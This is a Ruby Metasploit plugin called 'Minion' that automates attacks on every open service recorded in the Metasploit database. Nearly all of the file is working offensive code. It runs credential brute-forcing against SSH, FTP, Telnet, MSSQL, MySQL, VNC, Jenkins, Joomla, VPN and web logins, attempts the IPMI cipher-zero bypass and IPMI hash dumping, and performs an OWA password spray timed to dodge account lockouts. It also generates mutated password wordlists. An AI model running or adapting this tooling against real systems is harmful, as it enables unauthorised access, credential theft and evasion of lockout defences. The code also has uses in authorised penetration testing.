module Msf

	class Plugin::Minion < Msf::Plugin

		def initialize(framework, opts)
			super
			add_console_dispatcher(MinionCommandDispatcher)

      banner = %{
        ::::    ::::  ::::::::::: ::::    ::: ::::::::::: ::::::::  ::::    ::: 
        +:+:+: :+:+:+     :+:     :+:+:   :+:     :+:    :+:    :+: :+:+:   :+: 
        +:+ +:+:+ +:+     +:+     :+:+:+  +:+     +:+    +:+    +:+ :+:+:+  +:+ 
        +#+  +:+  +#+     +#+     +#+ +:+ +#+     +#+    +#+    +:+ +#+ +:+ +#+ 
        +#+       +#+     +#+     +#+  +#+#+#     +#+    +#+    +#+ +#+  +#+#+# 
        #+#       #+#     #+#     #+#   #+#+#     #+#    #+#    #+# #+#   #+#+# 
        ###       ### ########### ###    #### ########### ########  ###    ####
      }
      print_line banner
      print_status "Version 1.2 (King Bob)"
		end

		def cleanup
			self.framework.events.remove_session_subscriber(self)
			remove_console_dispatcher("Minion")
		end

		def name
			"Minion"
		end

		def desc
			"Automate stuff in the MSF database. Why burn time when a minion could do it?"
		end

		class MinionCommandDispatcher
			include Msf::Ui::Console::CommandDispatcher

      ###############################################
      ### ADJUST THESE SETTINGS AS DESIRED ##########
			###############################################
      
      # The maximum number of concurrent threads/jobs allowed to run
      MaxThreadCount = 40

      # metasplit wordlist path
      MSF_WORDLIST_PATH = "/usr/share/metasploit-framework/data/wordlists/"

      # HTTP pass_file list
      HTTP_PASS_FILE = "http_default_pass.txt"

      # HTTP userpass_file list
      HTTP_USERPASS_FILE = "http_default_userpass.txt"

      # SSH userpass_file credential list
      SSH_USERPASS_FILE = "root_userpass.txt"
			
      # TELNET userpass_file credential list
      TELNET_USERPASS_FILE = "routers_userpass.txt"

      # FTP userpass_file credential list
      FTP_USERPASS_FILE = "root_userpass.txt"

      # MSSQL pass_file list
      MSSQL_PASS_FILE = "unix_passwords.txt"

      # MYSQL pass_file list
      MYSQL_PASS_FILE = "unix_passwords.txt"

      # RLOGIN userpass_file credential list
      RLOGIN_USERPASS_FILE = "root_userpass.txt"

      # VMWARE userpass_file credential list
      VMWARE_USERPASS_FILE = "root_userpass.txt"

      # DNS domain name to enumerate -- this will typically be the domain name on an internal network
      DNS_DOMAIN = "example.com"

      # SMTP relay check email addresses
      SMTP_FROM_ADDRESS = "user@example.com"
      SMTP_TO_ADDRESS = "user@example.com"

      # The directory to place generated password lists into
      OUTPUT_DIR = "/tmp/"
      
      # Cisco SSL VPN userpass_file credential list
      CISCO_SSL_USERPASS_FILE = "routers_userpass.txt"
      
      ###############################################
      ### END ADJUST THESE SETTINGS AS DESIRED ######
      ###############################################

			def commands
				{
					'ssh_attack' => "Try password guessing on SSH services",
					'snmp_attack' => "Try password guessing on SNMP services",
					'ftp_attack' => "Try password guessing on FTP services",
          'tomcat_enum' => "Enumerate Apache Tomcat services",
					'tomcat_attack' => "Try password guessing on Apache Tomcat Mgr services",
					'http_attack' => "Try password guessing on HTTP services",
					'jboss_enum' => "Enumerate Jboss services",
          'report_hosts' => "Spit out all open ports and info for each host",
          'smb_enum' => "Enumerate SMB services and Windows OS versions",
          'mssql_enum' => "Enumerate MSSQL services",
          'mssql_attack_blank' => "Try a blank password for the sa user on MSSQL services",
          'mssql_attack' => "Try common users and passwords on MSSQL services",
          'ipmi_enum' => "Enumerate IPMI services",
          'ipmi_czero' => "Try Cipher Zero auth bypass on IPMI services",
          'ipmi_dumphashes' => "Try to dump user hashes on IPMI services",
          'mysql_enum' => "Enumerate MYSQL services",
          'mysql_attack' => "Try common users and passwords on MYSQL services",
          'telnet_attack' => "Try password guessing on TELNET services",
          'pop3_attack' => "Try password guessing on POP3 services",
          'rlogin_attack' => "Try password guessing on RLOGIN services",
          'vmware_attack' => "Try password guessing on VMAUTHD services",
          'dns_enum' => "Enumerate DNS services",
          'smtp_enum' => "Enumerate SMTP users",
          'smtp_relay_check' => "Check SMTP servers for open relay",
          'passwords_generate' => "Generate a list of password variants",
          'vnc_attack' => "Try password guessing on VNC services",
          'vnc_none_auth' => "Check for No Auth on VNC services",
          'owa_sweep' => "Sweep owa for common passwords, but pause to avoid account lockouts",
          'axis_attack' => "Try password guessing on AXIS HTTP services",
          'cisco_ssl_vpn_attack' => "Try password guessing on CISCO SSL VPN services",
          'http_dir_enum' => "Try guessing common web directories",
          'glassfish_attack' => "Try password guessing on GlassFish services",
          'ssl_enum' => "Enumerate SSL Certificate information",
          'http_title_enum' => "Enumerate response to web request",
          'webdav_enum' => "Enumerate WebDAV",
          'jenkins_enum' => "Enumerate Jenkins services",
          'jenkins_attack' => "Try password guessing on Jenkins HTTP services",
          'joomla_attack' => "Try password guessing on Joomla HTTP services",
          'wordpress_enum' => "Enumerate Wordpress version informaiton",
          'wordpress_login_enum' => "Enumerate Wordpress user informaiton"
				}
			end

			def name
				"Minion"
			end

			def cmd_ssh_attack
        self.shell.run_single("use auxiliary/scanner/ssh/ssh_login")
        self.shell.run_single("set USERPASS_FILE #{MSF_WORDLIST_PATH}#{SSH_USERPASS_FILE}")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true") 
        run_aux_module("ssh")      	
      end

      def cmd_snmp_attack
        self.shell.run_single("use auxiliary/scanner/snmp/snmp_login")
        self.shell.run_single("set VERBOSE false")
        run_aux_module("snmp") 
      end

      def cmd_ftp_attack
        self.shell.run_single("use auxiliary/scanner/ftp/ftp_login")
        self.shell.run_single("set USERPASS_FILE #{MSF_WORDLIST_PATH}#{FTP_USERPASS_FILE}")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true")	
        run_aux_module("ftp")
      end

      def cmd_tomcat_attack
        self.shell.run_single("use auxiliary/scanner/http/tomcat_mgr_login")
        self.shell.run_single("set VERBOSE true")
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

      def cmd_http_attack
        self.shell.run_single("use auxiliary/scanner/http/http_login")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true") 
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

      def cmd_jboss_enum
			  self.shell.run_single("use auxiliary/scanner/http/jboss_vulnscan")
        self.shell.run_single("set VERBOSE true")
			  self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

			def cmd_tomcat_enum
			  self.shell.run_single("use auxiliary/scanner/http/tomcat_enum")
        self.shell.run_single("set VERBOSE true")
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")  
			end

      def cmd_smb_enum
        self.shell.run_single("use auxiliary/scanner/smb/smb_version")
        self.shell.run_single("set VERBOSE false")
        run_aux_module("smb")
      end

      def cmd_mssql_enum
        self.shell.run_single("use auxiliary/scanner/mssql/mssql_ping")
        self.shell.run_single("set VERBOSE false")
        run_aux_module("mssql")
        run_aux_module("ms-sql-s")
      end

      def cmd_mssql_attack_blank
        self.shell.run_single("use auxiliary/scanner/mssql/mssql_login")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set USERNAME sa")
        self.shell.run_single("set VERBOSE false")
        run_aux_module("mssql")
        run_aux_module("ms-sql-s")
      end

      def cmd_mssql_attack
        self.shell.run_single("use auxiliary/scanner/mssql/mssql_login")
        self.shell.run_single("set PASS_FILE #{MSF_WORDLIST_PATH}#{MSSQL_PASS_FILE}")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set USER_AS_PASS true")
         self.shell.run_single("set USERNAME sa")
        self.shell.run_single("set VERBOSE false")
        run_aux_module("mssql")
        run_aux_module("ms-sql-s")
      end

      def cmd_ipmi_enum
        self.shell.run_single("use auxiliary/scanner/ipmi/ipmi_version")
        run_aux_module("asf-rmcp")
        run_aux_module("ipmi")
      end

      def cmd_ipmi_czero
        self.shell.run_single("use auxiliary/scanner/ipmi/ipmi_cipher_zero")
        run_aux_module("asf-rmcp")
        run_aux_module("ipmi")
      end

      def cmd_ipmi_dumphashes
        self.shell.run_single("use auxiliary/scanner/ipmi/ipmi_dumphashes")
        run_aux_module("asf-rmcp")
        run_aux_module("ipmi")
      end

      def cmd_mysql_enum
        self.shell.run_single("use auxiliary/scanner/mysql/mysql_version")
        self.shell.run_single("set VERBOSE false")
        run_aux_module("mysql")
      end

      def cmd_mysql_attack
        self.shell.run_single("use auxiliary/scanner/mysql/mysql_login")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set USERNAME root")
        self.shell.run_single("set PASS_FILE #{MSF_WORDLIST_PATH}#{MYSQL_PASS_FILE}")
        self.shell.run_single("set VERBOSE false")
        run_aux_module("mysql")
      end

      def cmd_telnet_attack
        self.shell.run_single("use auxiliary/scanner/telnet/telnet_login")
        self.shell.run_single("set USERPASS_FILE #{MSF_WORDLIST_PATH}#{TELNET_USERPASS_FILE}")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true") 
        run_aux_module("telnet")       
      end

      def cmd_pop3_attack
        self.shell.run_single("use auxiliary/scanner/pop3/pop3_login")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true") 
        run_aux_module("pop3")       
      end

      def cmd_rlogin_attack
        self.shell.run_single("use auxiliary/scanner/rservices/rlogin_login")
        self.shell.run_single("set USERPASS_FILE #{MSF_WORDLIST_PATH}#{RLOGIN_USERPASS_FILE}")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true") 
        run_aux_module("rlogin")       
      end

       def cmd_vmware_attack
        self.shell.run_single("use auxiliary/scanner/vmware/vmauthd_login")
        self.shell.run_single("set USERPASS_FILE #{MSF_WORDLIST_PATH}#{VMWARE_USERPASS_FILE}")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true") 
        run_aux_module("vmware_auth")       
      end

      def cmd_dns_enum
        self.shell.run_single("use auxiliary/gather/enum_dns")
        self.shell.run_single("set VERBOSE true")
        self.shell.run_single("set DOMAIN #{DNS_DOMAIN}")
        run_aux_module("dns")
      end

      def cmd_smtp_enum
        self.shell.run_single("use auxiliary/scanner/smtp/smtp_enum")
        self.shell.run_single("set VERBOSE true")
        run_aux_module("smtp")
      end

      def cmd_smtp_relay_check
        self.shell.run_single("use auxiliary/scanner/smtp/smtp_relay")
        self.shell.run_single("set VERBOSE true")
        self.shell.run_single("set MAILFROM #{SMTP_FROM_ADDRESS}")
        self.shell.run_single("set MAILTO #{SMTP_TO_ADDRESS}")
        run_aux_module("smtp")
      end

      def cmd_cisco_ssl_attack
        self.shell.run_single("use auxiliary/scanner/http/cisco_ssl_vpn")
        self.shell.run_single("set USERPASS_FILE #{MSF_WORDLIST_PATH}#{CISCO_SSL_USERPASS_FILE}")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true") 
        run_aux_module("cisco-ssl-vpn-svr")       
      end

      def cmd_vnc_attack
        self.shell.run_single("use auxiliary/scanner/vnc/vnc_login")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true") 
        run_aux_module("vnc")       
      end

      def cmd_vnc_none_auth
        self.shell.run_single("use auxiliary/scanner/vnc/vnc_none_auth")
        run_aux_module("vnc")       
      end

      def cmd_axis_attack
        self.shell.run_single("use auxiliary/scanner/http/axis_login")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set USERNAME admin")
        self.shell.run_single("set PASSWORD axis2")
        self.shell.run_single("set VERBOSE true") 
        self.shell.run_single("set PASS_FILE #{MSF_WORDLIST_PATH}#{HTTP_PASS_FILE}")
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

      def cmd_cisco_ssl_vpn_attack
        self.shell.run_single("use auxiliary/scanner/http/cisco_ssl_vpn")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true") 
        self.shell.run_single("set PASS_FILE #{MSF_WORDLIST_PATH}#{HTTP_PASS_FILE}")
        run_aux_module("https")
      end

      def cmd_http_dir_enum
        self.shell.run_single("use auxiliary/scanner/http/dir_scanner")
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

      def cmd_glassfish_attack
        self.shell.run_single("use auxiliary/scanner/http/glassfish_login")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true") 
        self.shell.run_single("set PASS_FILE #{MSF_WORDLIST_PATH}#{HTTP_PASS_FILE}")
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

      def cmd_ssl_enum
        self.shell.run_single("use auxiliary/scanner/http/ssl")
        run_aux_module("https")
      end

      def cmd_http_title_enum
        self.shell.run_single("use auxiliary/scanner/http/title")
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

      def cmd_webdav_enum
        self.shell.run_single("use auxiliary/scanner/http/webdav_scanner")
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

      def cmd_jenkins_enum
        self.shell.run_single("use auxiliary/scanner/http/jenkins_enum")
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

      def cmd_jenkins_attack
        self.shell.run_single("use auxiliary/scanner/http/jenkins_login")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true")
        self.shell.run_single("set USERNAME admin")
        self.shell.run_single("set PASS_FILE #{MSF_WORDLIST_PATH}#{HTTP_PASS_FILE}")
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

      def cmd_joomla_attack
        self.shell.run_single("use auxiliary/scanner/http/joomla_bruteforce_login")
        self.shell.run_single("set USER_AS_PASS true")
        self.shell.run_single("set BLANK_PASSWORDS true")
        self.shell.run_single("set VERBOSE true")
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

      def cmd_wordpress_enum
        self.shell.run_single("use auxiliary/scanner/http/wordpress_scanner")
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

      def cmd_wordpress_login_enum
        self.shell.run_single("use auxiliary/scanner/http/wordpress_login_enum")
        self.shell.run_single("set SSL false")
        run_aux_module("http")
        run_aux_module("www")
        self.shell.run_single("set SSL true")
        run_aux_module("https")
      end

      def run_aux_module(service_name)
        framework.db.hosts.each do |host|
          host.services.each do |service|
            while framework.jobs.count >= MaxThreadCount do
              sleep(3)
            end
            if service.name == service_name and service.state == "open"
              self.shell.run_single("set RHOSTS #{host.address}")
              self.shell.run_single("set RPORT #{service.port}")
              self.shell.run_single("run -j")
            end
          end
        end
      end

      def cmd_owa_sweep(*args)
        # Define options
        opts = Rex::Parser::Arguments.new(
          "-p"   => [ true, "Path to a file containing a list of passwords, one per line."],
          "-u"   => [ true, "Path to a file containing a list of users, one per line"],
          "-t"   => [ true, "The amount of time in minutes to wait between sweeps. This is used to avoid exceeding account lockouts."],
          "-s"   => [ true, "The IP Address of the OWA server."],
          "-h"   => [ false,  "Command Help."]
        )

        user_file_path = ''
        pass_file_path = ''
        pausetime = 61
        owa_server = ''

        # Parse options
        opts.parse(args) do |opt, idx, val|
          case opt
          when "-u"
            user_file_path = val
          when "-p"
            pass_file_path = val
          when "-t"
            pausetime = val
          when "-s"
            owa_server = val
          when "-h"
            print_line(opts.usage)
            return
          else
            print_line(opts.usage)
            return
          end
        end

        if not user_file_path.empty? and not pass_file_path.empty? and not pausetime.empty? and not owa_server.empty?
          pass_list = []
          pass_file = open(pass_file_path, "r")
          pass_file.each_line do |pass|
            pass_list.append(pass)
          end

          print_status("Starting OWA password sweeping, pausing every #{pausetime} minutes to avoid account lockouts...")
          pass_list.each do |pass|
            print_status("Starting sweep with #{pass}...")
            owa_sweep(owa_server, pass, user_file_path)
            print_status("Completed sweep with #{pass}...")
            sleep(pausetime.to_i * 60)
          end
          print_status("Done OWA password sweeping. Check creds database for valid accounts!")
        else
          print_error("You are missing required parameters.")
          print_line(opts.usage)
        end
      end

      def owa_sweep(owa_server, password, user_file_path)
        self.shell.run_single("use auxiliary/scanner/http/owa_login")
        self.shell.run_single("set USER_FILE #{user_file_path}")
        self.shell.run_single("set PASSWORD #{password}")
        self.shell.run_single("set RHOST #{owa_server}")
        self.shell.run_single("set timestampoutput true")
        self.shell.run_single("set VERBOSE true")
        self.shell.run_single("run")
      end

      def cmd_report_hosts
        print_status("Generating list of hosts with open ports...")
        print_line("IP Address\tPorts\tHost Name\tHost Type")
        
        framework.db.hosts.each do |host|
          services_csv = ""
          host.services.each do |service|
            if service.state == "open"
              services_csv += "#{service.port}\\#{service.proto},"
            end
          end
          services_csv = services_csv.chomp(",")
          if services_csv.length > 0
            print_line("#{host.address}\t#{services_csv}\t#{host.name}\t#{host.os_name} #{host.os_sp}")
          end
        end
      end

      def cmd_passwords_generate(*args)
        # Define options
        opts = Rex::Parser::Arguments.new(
          "-w"   => [ true, "List words, seperated by a space, to generate varations."],
          "-h"   => [ false,  "Command Help."]
        )

        # Parse options
        opts.parse(args) do |opt, idx, val|
          case opt
          when "-w"
            generate_pword_list(val)
          when "-h"
            print_line(opts.usage)
            return
          else
            print_line(opts.usage)
            return
          end
        end
      end

      def generate_pword_list(keywords)
        pwd_list = ""
        keywordslist = keywords.split(" ")
        leetlist = []
        outputlist = []
        keywordslist.each do |word|
          leetlist += generate_word_leetspeak(word)
        end

        keywordslist += leetlist   
   
        keywordslist.each do |word|
          outputlist += generate_word_variations(word)
        end
   
        outputlist = outputlist.uniq
        
        outfile = "#{OUTPUT_DIR}minion_#{1 + rand(9999)}.lst"
        print_line("Writing wordlist to #{outfile}...")
        writefile = open(outfile, "w")
        outputlist.each do |word|
            writefile.write("#{word}\n")
        end
        writefile.close()
        print_line("Writing wordlist to #{outfile}...done!")

      end
      
      def generate_word_variations(word)
        print_line("Generating password variations for #{word}...")
        varlist = ['0','1','2','3','4','5','6','7','8','9','!','@','#','$','%','&','*','=','+','?','.','/','\\','|','00',
          '01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','69','88',
          '77','99','0000','007','987','789','2014','2015','2016','1!','12','123','321','123!','1234','4321','!!','##','!#',
          '#1','#123','!@#','!@#$','@#$%^&','$$','[1]','$2014','$2015','$2016','$2017','14!','15!','16!','17!','qaz','abcd']
           
        results = []
        results.push(word)
        results.push(word.upcase)

        varlist.each do |item|
          #normal
          results.push(word + item)
          results.push(item + word)
          #lower
          results.push(word.downcase + item)
          results.push(item + word.downcase)
          #upper
          results.push(word.upcase + item)
          results.push(item + word.upcase)
          #both sides
          results.push(item + word + item)
          #first letter upper
          results.push(word[0].upcase + word[1,word.length-1] + item)
        end
        return results
      end

      def generate_word_leetspeak(word)
        leetlist = [['a','A','@'],['e','E','3'],['i','I','1'],['o','O','0'],['s','S','$']]
        masterword = word
        words = []
        leetlist.each do |item|
          wrd1 = word.sub(item[0], item[2])
          wrd2 = word.sub(item[1], item[2])
          masterword = masterword.sub(item[0], item[2].sub(item[1], item[2]))
          if wrd1 != word
            words.push(wrd1)
          end
          if wrd2 != word
            words.push(wrd2)
          end
        end
       
        words.insert(0,masterword)
        return words
      end      
      #end of functions
		end
	end
end